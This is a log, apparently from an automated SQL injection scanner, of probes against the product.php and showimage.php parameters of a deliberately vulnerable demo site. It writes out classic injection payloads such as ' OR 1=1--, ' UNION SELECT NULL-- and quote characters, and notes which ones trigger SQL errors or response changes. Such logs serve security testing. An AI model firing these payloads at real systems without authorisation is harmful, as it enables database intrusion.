+2025-11-10 11:20:54,665 INFO: [SQLi-DOM] pic=" OR "1"="1 caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/product.php?pic=3%22+OR+%221%22%3D%221
+2025-11-10 11:20:55,478 INFO: [SQLi] pic=` -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=3%60
+2025-11-10 11:20:55,478 INFO: [SQLi-LEN] pic=` caused response size delta at http://testphp.vulnweb.com/product.php?pic=3%60
+2025-11-10 11:20:55,481 INFO: [SQLi-DOM] pic=` caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/product.php?pic=3%60
+2025-11-10 11:20:56,364 INFO: [SQLi] pic=')-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=3%27%29--
+2025-11-10 11:20:56,364 INFO: [SQLi-LEN] pic=')-- caused response size delta at http://testphp.vulnweb.com/product.php?pic=3%27%29--
+2025-11-10 11:20:56,367 INFO: [SQLi-DOM] pic=')-- caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/product.php?pic=3%27%29--
+2025-11-10 11:20:57,147 INFO: [SQLi] pic=' UNION SELECT NULL-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=3%27+UNION+SELECT+NULL--
+2025-11-10 11:20:57,147 INFO: [SQLi-LEN] pic=' UNION SELECT NULL-- caused response size delta at http://testphp.vulnweb.com/product.php?pic=3%27+UNION+SELECT+NULL--
+2025-11-10 11:20:57,149 INFO: [SQLi-DOM] pic=' UNION SELECT NULL-- caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/product.php?pic=3%27+UNION+SELECT+NULL--
+2025-11-10 11:20:57,928 INFO: [SQLi] pic=' OR 1=1-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=3%27+OR+1%3D1--
+2025-11-10 11:20:57,928 INFO: [SQLi-LEN] pic=' OR 1=1-- caused response size delta at http://testphp.vulnweb.com/product.php?pic=3%27+OR+1%3D1--
+2025-11-10 11:20:57,931 INFO: [SQLi-DOM] pic=' OR 1=1-- caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/product.php?pic=3%27+OR+1%3D1--
+2025-11-10 11:20:58,728 INFO: [SQLi] pic=" OR 1=1-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=3%22+OR+1%3D1--
+2025-11-10 11:20:58,728 INFO: [SQLi-LEN] pic=" OR 1=1-- caused response size delta at http://testphp.vulnweb.com/product.php?pic=3%22+OR+1%3D1--
+2025-11-10 11:20:58,729 INFO: [SQLi-DOM] pic=" OR 1=1-- caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/product.php?pic=3%22+OR+1%3D1--
+2025-11-10 11:20:58,731 INFO: Testing parameters at: http://testphp.vulnweb.com/showimage.php?file=./pictures/3.jpg
+2025-11-10 11:21:00,446 INFO: [SQLi-LEN] file=' caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F3.jpg%27
+2025-11-10 11:21:00,447 INFO: [SQLi-DOM] file=' caused DOM diff score 0.0 @ http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F3.jpg%27
+2025-11-10 11:21:01,260 INFO: [SQLi-LEN] file=' OR '1'='1 caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F3.jpg%27+OR+%271%27%3D%271
+2025-11-10 11:21:01,261 INFO: [SQLi-DOM] file=' OR '1'='1 caused DOM diff score 0.0 @ http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F3.jpg%27+OR+%271%27%3D%271
+2025-11-10 11:21:02,311 INFO: [SQLi-LEN] file=" caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F3.jpg%22
+2025-11-10 11:21:02,312 INFO: [SQLi-DOM] file=" caused DOM diff score 0.0 @ http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F3.jpg%22
+2025-11-10 11:21:03,078 INFO: [SQLi-LEN] file=" OR "1"="1 caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F3.jpg%22+OR+%221%22%3D%221
+2025-11-10 11:21:03,078 INFO: [SQLi-DOM] file=" OR "1"="1 caused DOM diff score 0.0 @ http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F3.jpg%22+OR+%221%22%3D%221
+2025-11-10 11:21:03,861 INFO: [SQLi-LEN] file=` caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F3.jpg%60
+2025-11-10 11:21:03,862 INFO: [SQLi-DOM] file=` caused DOM diff score 0.0 @ http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F3.jpg%60
+2025-11-10 11:21:04,646 INFO: [SQLi-LEN] file=')-- caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F3.jpg%27%29--
+2025-11-10 11:21:04,647 INFO: [SQLi-DOM] file=')-- caused DOM diff score 0.0 @ http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F3.jpg%27%29--
+2025-11-10 11:21:05,477 INFO: [SQLi-LEN] file=' UNION SELECT NULL-- caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F3.jpg%27+UNION+SELECT+NULL--
+2025-11-10 11:21:05,477 INFO: [SQLi-DOM] file=' UNION SELECT NULL-- caused DOM diff score 0.0 @ http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F3.jpg%27+UNION+SELECT+NULL--
+2025-11-10 11:21:06,343 INFO: [SQLi-LEN] file=' OR 1=1-- caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F3.jpg%27+OR+1%3D1--
+2025-11-10 11:21:06,345 INFO: [SQLi-DOM] file=' OR 1=1-- caused DOM diff score 0.0 @ http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F3.jpg%27+OR+1%3D1--
+2025-11-10 11:21:07,143 INFO: [SQLi-LEN] file=" OR 1=1-- caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F3.jpg%22+OR+1%3D1--
+2025-11-10 11:21:07,144 INFO: [SQLi-DOM] file=" OR 1=1-- caused DOM diff score 0.0 @ http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F3.jpg%22+OR+1%3D1--
+2025-11-10 11:21:07,144 INFO: Testing parameters at: http://testphp.vulnweb.com/product.php?pic=4
+2025-11-10 11:21:08,797 INFO: [SQLi] pic=' -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=4%27
+2025-11-10 11:21:08,797 INFO: [SQLi-LEN] pic=' caused response size delta at http://testphp.vulnweb.com/product.php?pic=4%27
+2025-11-10 11:21:08,800 INFO: [SQLi-DOM] pic=' caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/product.php?pic=4%27
+2025-11-10 11:21:09,709 INFO: [SQLi] pic=' OR '1'='1 -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=4%27+OR+%271%27%3D%271
+2025-11-10 11:21:09,709 INFO: [SQLi-LEN] pic=' OR '1'='1 caused response size delta at http://testphp.vulnweb.com/product.php?pic=4%27+OR+%271%27%3D%271
+2025-11-10 11:21:09,712 INFO: [SQLi-DOM] pic=' OR '1'='1 caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/product.php?pic=4%27+OR+%271%27%3D%271
+2025-11-10 11:21:10,492 INFO: [SQLi] pic=" -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=4%22
+2025-11-10 11:21:10,492 INFO: [SQLi-LEN] pic=" caused response size delta at http://testphp.vulnweb.com/product.php?pic=4%22
+2025-11-10 11:21:10,495 INFO: [SQLi-DOM] pic=" caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/product.php?pic=4%22
+2025-11-10 11:21:11,309 INFO: [SQLi] pic=" OR "1"="1 -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=4%22+OR+%221%22%3D%221
+2025-11-10 11:21:11,309 INFO: [SQLi-LEN] pic=" OR "1"="1 caused response size delta at http://testphp.vulnweb.com/product.php?pic=4%22+OR+%221%22%3D%221
+2025-11-10 11:21:11,312 INFO: [SQLi-DOM] pic=" OR "1"="1 caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/product.php?pic=4%22+OR+%221%22%3D%221
+2025-11-10 11:21:12,109 INFO: [SQLi] pic=` -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=4%60
+2025-11-10 11:21:12,110 INFO: [SQLi-LEN] pic=` caused response size delta at http://testphp.vulnweb.com/product.php?pic=4%60
+2025-11-10 11:21:12,116 INFO: [SQLi-DOM] pic=` caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/product.php?pic=4%60
+2025-11-10 11:21:13,079 INFO: [SQLi] pic=')-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=4%27%29--
+2025-11-10 11:21:13,079 INFO: [SQLi-LEN] pic=')-- caused response size delta at http://testphp.vulnweb.com/product.php?pic=4%27%29--
+2025-11-10 11:21:13,082 INFO: [SQLi-DOM] pic=')-- caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/product.php?pic=4%27%29--
+2025-11-10 11:21:13,876 INFO: [SQLi] pic=' UNION SELECT NULL-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=4%27+UNION+SELECT+NULL--
+2025-11-10 11:21:13,876 INFO: [SQLi-LEN] pic=' UNION SELECT NULL-- caused response size delta at http://testphp.vulnweb.com/product.php?pic=4%27+UNION+SELECT+NULL--
+2025-11-10 11:21:13,884 INFO: [SQLi-DOM] pic=' UNION SELECT NULL-- caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/product.php?pic=4%27+UNION+SELECT+NULL--
+2025-11-10 11:21:14,659 INFO: [SQLi] pic=' OR 1=1-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=4%27+OR+1%3D1--
+2025-11-10 11:21:14,660 INFO: [SQLi-LEN] pic=' OR 1=1-- caused response size delta at http://testphp.vulnweb.com/product.php?pic=4%27+OR+1%3D1--
+2025-11-10 11:21:14,666 INFO: [SQLi-DOM] pic=' OR 1=1-- caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/product.php?pic=4%27+OR+1%3D1--
+2025-11-10 11:21:15,476 INFO: [SQLi] pic=" OR 1=1-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=4%22+OR+1%3D1--
+2025-11-10 11:21:15,477 INFO: [SQLi-LEN] pic=" OR 1=1-- caused response size delta at http://testphp.vulnweb.com/product.php?pic=4%22+OR+1%3D1--
+2025-11-10 11:21:15,485 INFO: [SQLi-DOM] pic=" OR 1=1-- caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/product.php?pic=4%22+OR+1%3D1--
+2025-11-10 11:21:15,487 INFO: Testing parameters at: http://testphp.vulnweb.com/showimage.php?file=./pictures/4.jpg
+2025-11-10 11:21:17,363 INFO: [SQLi-LEN] file=' caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F4.jpg%27
+2025-11-10 11:21:17,370 INFO: [SQLi-DOM] file=' caused DOM diff score 0.0 @ http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F4.jpg%27
+2025-11-10 11:21:18,190 INFO: [SQLi-LEN] file=' OR '1'='1 caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F4.jpg%27+OR+%271%27%3D%271
+2025-11-10 11:21:18,197 INFO: [SQLi-DOM] file=' OR '1'='1 caused DOM diff score 0.0 @ http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F4.jpg%27+OR+%271%27%3D%271
+2025-11-10 11:21:19,151 INFO: [SQLi-LEN] file=" caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F4.jpg%22
+2025-11-10 11:21:19,155 INFO: [SQLi-DOM] file=" caused DOM diff score 0.0 @ http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F4.jpg%22
+2025-11-10 11:21:19,945 INFO: [SQLi-LEN] file=" OR "1"="1 caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F4.jpg%22+OR+%221%22%3D%221
+2025-11-10 11:21:19,952 INFO: [SQLi-DOM] file=" OR "1"="1 caused DOM diff score 0.0 @ http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F4.jpg%22+OR+%221%22%3D%221
+2025-11-10 11:21:20,775 INFO: [SQLi-LEN] file=` caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F4.jpg%60
+2025-11-10 11:21:20,782 INFO: [SQLi-DOM] file=` caused DOM diff score 0.0 @ http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F4.jpg%60
+2025-11-10 11:21:21,713 INFO: [SQLi-LEN] file=')-- caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F4.jpg%27%29--
+2025-11-10 11:21:21,717 INFO: [SQLi-DOM] file=')-- caused DOM diff score 0.0 @ http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F4.jpg%27%29--
+2025-11-10 11:21:22,527 INFO: [SQLi-LEN] file=' UNION SELECT NULL-- caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F4.jpg%27+UNION+SELECT+NULL--
+2025-11-10 11:21:22,532 INFO: [SQLi-DOM] file=' UNION SELECT NULL-- caused DOM diff score 0.0 @ http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F4.jpg%27+UNION+SELECT+NULL--
+2025-11-10 11:21:23,498 INFO: [SQLi-LEN] file=' OR 1=1-- caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F4.jpg%27+OR+1%3D1--
+2025-11-10 11:21:23,502 INFO: [SQLi-DOM] file=' OR 1=1-- caused DOM diff score 0.0 @ http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F4.jpg%27+OR+1%3D1--
+2025-11-10 11:21:24,438 INFO: [SQLi-LEN] file=" OR 1=1-- caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F4.jpg%22+OR+1%3D1--
+2025-11-10 11:21:24,442 INFO: [SQLi-DOM] file=" OR 1=1-- caused DOM diff score 0.0 @ http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F4.jpg%22+OR+1%3D1--
+2025-11-10 11:21:24,444 INFO: Testing parameters at: http://testphp.vulnweb.com/product.php?pic=5
+2025-11-10 11:21:26,377 INFO: [SQLi] pic=' -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=5%27
+2025-11-10 11:21:26,379 INFO: [SQLi-LEN] pic=' caused response size delta at http://testphp.vulnweb.com/product.php?pic=5%27
+2025-11-10 11:21:26,407 INFO: [SQLi-DOM] pic=' caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/product.php?pic=5%27
+2025-11-10 11:21:27,215 INFO: [SQLi] pic=' OR '1'='1 -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=5%27+OR+%271%27%3D%271
+2025-11-10 11:21:27,216 INFO: [SQLi-LEN] pic=' OR '1'='1 caused response size delta at http://testphp.vulnweb.com/product.php?pic=5%27+OR+%271%27%3D%271
+2025-11-10 11:21:27,230 INFO: [SQLi-DOM] pic=' OR '1'='1 caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/product.php?pic=5%27+OR+%271%27%3D%271
+2025-11-10 11:21:28,112 INFO: [SQLi] pic=" -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=5%22
+2025-11-10 11:21:28,112 INFO: [SQLi-LEN] pic=" caused response size delta at http://testphp.vulnweb.com/product.php?pic=5%22
+2025-11-10 11:21:28,135 INFO: [SQLi-DOM] pic=" caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/product.php?pic=5%22
+2025-11-10 11:21:29,064 INFO: [SQLi] pic=" OR "1"="1 -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=5%22+OR+%221%22%3D%221
+2025-11-10 11:21:29,065 INFO: [SQLi-LEN] pic=" OR "1"="1 caused response size delta at http://testphp.vulnweb.com/product.php?pic=5%22+OR+%221%22%3D%221
+2025-11-10 11:21:29,075 INFO: [SQLi-DOM] pic=" OR "1"="1 caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/product.php?pic=5%22+OR+%221%22%3D%221
+2025-11-10 11:21:29,890 INFO: [SQLi] pic=` -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=5%60
+2025-11-10 11:21:29,892 INFO: [SQLi-LEN] pic=` caused response size delta at http://testphp.vulnweb.com/product.php?pic=5%60
+2025-11-10 11:21:29,911 INFO: [SQLi-DOM] pic=` caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/product.php?pic=5%60
+2025-11-10 11:21:30,836 INFO: [SQLi] pic=')-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=5%27%29--
+2025-11-10 11:21:30,837 INFO: [SQLi-LEN] pic=')-- caused response size delta at http://testphp.vulnweb.com/product.php?pic=5%27%29--
+2025-11-10 11:21:30,856 INFO: [SQLi-DOM] pic=')-- caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/product.php?pic=5%27%29--
+2025-11-10 11:21:31,630 INFO: [SQLi] pic=' UNION SELECT NULL-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=5%27+UNION+SELECT+NULL--
+2025-11-10 11:21:31,632 INFO: [SQLi-LEN] pic=' UNION SELECT NULL-- caused response size delta at http://testphp.vulnweb.com/product.php?pic=5%27+UNION+SELECT+NULL--
+2025-11-10 11:21:31,657 INFO: [SQLi-DOM] pic=' UNION SELECT NULL-- caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/product.php?pic=5%27+UNION+SELECT+NULL--
+2025-11-10 11:21:32,524 INFO: [SQLi] pic=' OR 1=1-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=5%27+OR+1%3D1--
+2025-11-10 11:21:32,524 INFO: [SQLi-LEN] pic=' OR 1=1-- caused response size delta at http://testphp.vulnweb.com/product.php?pic=5%27+OR+1%3D1--
+2025-11-10 11:21:32,529 INFO: [SQLi-DOM] pic=' OR 1=1-- caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/product.php?pic=5%27+OR+1%3D1--
+2025-11-10 11:21:33,375 INFO: [SQLi] pic=" OR 1=1-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=5%22+OR+1%3D1--
+2025-11-10 11:21:33,376 INFO: [SQLi-LEN] pic=" OR 1=1-- caused response size delta at http://testphp.vulnweb.com/product.php?pic=5%22+OR+1%3D1--
+2025-11-10 11:21:33,394 INFO: [SQLi-DOM] pic=" OR 1=1-- caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/product.php?pic=5%22+OR+1%3D1--
+2025-11-10 11:21:33,396 INFO: Testing parameters at: http://testphp.vulnweb.com/showimage.php?file=./pictures/5.jpg
+2025-11-10 11:21:35,328 INFO: [SQLi-LEN] file=' caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F5.jpg%27
+2025-11-10 11:21:35,332 INFO: [SQLi-DOM] file=' caused DOM diff score 0.0 @ http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F5.jpg%27
+2025-11-10 11:21:36,272 INFO: [SQLi-LEN] file=' OR '1'='1 caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F5.jpg%27+OR+%271%27%3D%271
+2025-11-10 11:21:36,277 INFO: [SQLi-DOM] file=' OR '1'='1 caused DOM diff score 0.0 @ http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F5.jpg%27+OR+%271%27%3D%271
+2025-11-10 11:21:37,228 INFO: [SQLi-LEN] file=" caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F5.jpg%22
+2025-11-10 11:21:37,232 INFO: [SQLi-DOM] file=" caused DOM diff score 0.0 @ http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F5.jpg%22
+2025-11-10 11:21:38,025 INFO: [SQLi-LEN] file=" OR "1"="1 caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F5.jpg%22+OR+%221%22%3D%221
+2025-11-10 11:21:38,031 INFO: [SQLi-DOM] file=" OR "1"="1 caused DOM diff score 0.0 @ http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F5.jpg%22+OR+%221%22%3D%221
+2025-11-10 11:21:38,855 INFO: [SQLi-LEN] file=` caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F5.jpg%60
+2025-11-10 11:21:38,864 INFO: [SQLi-DOM] file=` caused DOM diff score 0.0 @ http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F5.jpg%60
+2025-11-10 11:21:39,797 INFO: [SQLi-LEN] file=')-- caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F5.jpg%27%29--
+2025-11-10 11:21:39,803 INFO: [SQLi-DOM] file=')-- caused DOM diff score 0.0 @ http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F5.jpg%27%29--
+2025-11-10 11:21:40,760 INFO: [SQLi-LEN] file=' UNION SELECT NULL-- caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F5.jpg%27+UNION+SELECT+NULL--
+2025-11-10 11:21:40,764 INFO: [SQLi-DOM] file=' UNION SELECT NULL-- caused DOM diff score 0.0 @ http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F5.jpg%27+UNION+SELECT+NULL--
+2025-11-10 11:21:41,580 INFO: [SQLi-LEN] file=' OR 1=1-- caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F5.jpg%27+OR+1%3D1--
+2025-11-10 11:21:41,585 INFO: [SQLi-DOM] file=' OR 1=1-- caused DOM diff score 0.0 @ http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F5.jpg%27+OR+1%3D1--
+2025-11-10 11:21:42,518 INFO: [SQLi-LEN] file=" OR 1=1-- caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F5.jpg%22+OR+1%3D1--
+2025-11-10 11:21:42,522 INFO: [SQLi-DOM] file=" OR 1=1-- caused DOM diff score 0.0 @ http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F5.jpg%22+OR+1%3D1--
+2025-11-10 11:21:42,525 INFO: Testing parameters at: http://testphp.vulnweb.com/product.php?pic=7
+2025-11-10 11:21:44,287 INFO: [SQLi] pic=' -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=7%27
+2025-11-10 11:21:44,289 INFO: [SQLi-LEN] pic=' caused response size delta at http://testphp.vulnweb.com/product.php?pic=7%27
+2025-11-10 11:21:44,314 INFO: [SQLi-DOM] pic=' caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/product.php?pic=7%27
+2025-11-10 11:21:45,236 INFO: [SQLi] pic=' OR '1'='1 -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=7%27+OR+%271%27%3D%271
+2025-11-10 11:21:45,237 INFO: [SQLi-LEN] pic=' OR '1'='1 caused response size delta at http://testphp.vulnweb.com/product.php?pic=7%27+OR+%271%27%3D%271
+2025-11-10 11:21:45,263 INFO: [SQLi-DOM] pic=' OR '1'='1 caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/product.php?pic=7%27+OR+%271%27%3D%271
+2025-11-10 11:21:46,058 INFO: [SQLi] pic=" -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=7%22
+2025-11-10 11:21:46,060 INFO: [SQLi-LEN] pic=" caused response size delta at http://testphp.vulnweb.com/product.php?pic=7%22
+2025-11-10 11:21:46,083 INFO: [SQLi-DOM] pic=" caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/product.php?pic=7%22
+2025-11-10 11:21:46,895 INFO: [SQLi] pic=" OR "1"="1 -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=7%22+OR+%221%22%3D%221
+2025-11-10 11:21:46,895 INFO: [SQLi-LEN] pic=" OR "1"="1 caused response size delta at http://testphp.vulnweb.com/product.php?pic=7%22+OR+%221%22%3D%221
+2025-11-10 11:21:46,915 INFO: [SQLi-DOM] pic=" OR "1"="1 caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/product.php?pic=7%22+OR+%221%22%3D%221
+2025-11-10 11:21:47,793 INFO: [SQLi] pic=` -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=7%60
+2025-11-10 11:21:47,795 INFO: [SQLi-LEN] pic=` caused response size delta at http://testphp.vulnweb.com/product.php?pic=7%60
+2025-11-10 11:21:47,817 INFO: [SQLi-DOM] pic=` caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/product.php?pic=7%60
+2025-11-10 11:21:48,620 INFO: [SQLi] pic=')-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=7%27%29--
+2025-11-10 11:21:48,633 INFO: [SQLi-LEN] pic=')-- caused response size delta at http://testphp.vulnweb.com/product.php?pic=7%27%29--
+2025-11-10 11:21:48,663 INFO: [SQLi-DOM] pic=')-- caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/product.php?pic=7%27%29--
+2025-11-10 11:21:49,546 INFO: [SQLi] pic=' UNION SELECT NULL-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=7%27+UNION+SELECT+NULL--
+2025-11-10 11:21:49,548 INFO: [SQLi-LEN] pic=' UNION SELECT NULL-- caused response size delta at http://testphp.vulnweb.com/product.php?pic=7%27+UNION+SELECT+NULL--
+2025-11-10 11:21:49,569 INFO: [SQLi-DOM] pic=' UNION SELECT NULL-- caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/product.php?pic=7%27+UNION+SELECT+NULL--
+2025-11-10 11:21:50,366 INFO: [SQLi] pic=' OR 1=1-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=7%27+OR+1%3D1--
+2025-11-10 11:21:50,366 INFO: [SQLi-LEN] pic=' OR 1=1-- caused response size delta at http://testphp.vulnweb.com/product.php?pic=7%27+OR+1%3D1--
+2025-11-10 11:21:50,372 INFO: [SQLi-DOM] pic=' OR 1=1-- caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/product.php?pic=7%27+OR+1%3D1--
+2025-11-10 11:21:51,157 INFO: [SQLi] pic=" OR 1=1-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=7%22+OR+1%3D1--
+2025-11-10 11:21:51,157 INFO: [SQLi-LEN] pic=" OR 1=1-- caused response size delta at http://testphp.vulnweb.com/product.php?pic=7%22+OR+1%3D1--
+2025-11-10 11:21:51,164 INFO: [SQLi-DOM] pic=" OR 1=1-- caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/product.php?pic=7%22+OR+1%3D1--
+2025-11-10 11:21:51,164 INFO: Testing parameters at: http://testphp.vulnweb.com/showimage.php?file=./pictures/7.jpg
+2025-11-10 11:21:53,230 INFO: [SQLi-LEN] file=' caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F7.jpg%27
+2025-11-10 11:21:53,232 INFO: [SQLi-DOM] file=' caused DOM diff score 0.0 @ http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F7.jpg%27
+2025-11-10 11:21:54,185 INFO: [SQLi-LEN] file=' OR '1'='1 caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F7.jpg%27+OR+%271%27%3D%271
+2025-11-10 11:21:54,185 INFO: [SQLi-DOM] file=' OR '1'='1 caused DOM diff score 0.0 @ http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F7.jpg%27+OR+%271%27%3D%271
+2025-11-10 11:21:54,980 INFO: [SQLi-LEN] file=" caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F7.jpg%22
+2025-11-10 11:21:54,982 INFO: [SQLi-DOM] file=" caused DOM diff score 0.0 @ http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F7.jpg%22
+2025-11-10 11:21:55,790 INFO: [SQLi-LEN] file=" OR "1"="1 caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F7.jpg%22+OR+%221%22%3D%221
+2025-11-10 11:21:55,793 INFO: [SQLi-DOM] file=" OR "1"="1 caused DOM diff score 0.0 @ http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F7.jpg%22+OR+%221%22%3D%221
+2025-11-10 11:21:56,756 INFO: [SQLi-LEN] file=` caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F7.jpg%60
+2025-11-10 11:21:56,758 INFO: [SQLi-DOM] file=` caused DOM diff score 0.0 @ http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F7.jpg%60
+2025-11-10 11:21:57,572 INFO: [SQLi-LEN] file=')-- caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F7.jpg%27%29--
+2025-11-10 11:21:57,574 INFO: [SQLi-DOM] file=')-- caused DOM diff score 0.0 @ http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F7.jpg%27%29--
